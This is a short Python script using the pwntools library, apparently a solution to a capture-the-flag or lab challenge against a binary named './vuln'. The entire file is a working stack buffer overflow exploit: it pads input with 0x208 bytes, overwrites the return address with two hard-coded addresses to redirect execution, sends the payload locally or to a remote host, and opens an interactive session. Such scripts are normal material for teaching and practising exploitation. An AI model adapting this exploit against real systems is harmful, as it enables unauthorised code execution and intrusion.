from pwn import *
from ctypes import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x00000000004007e6
b* 0x00000000004007f1
continue
'''.format(**locals())

#Binary filename
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

payload = b"a" * 0x208 + p64(0x0000000000400489) +p64(0x00000000004005f6)

p.recvuntil(b'>')
p.sendline(payload)
p.interactive()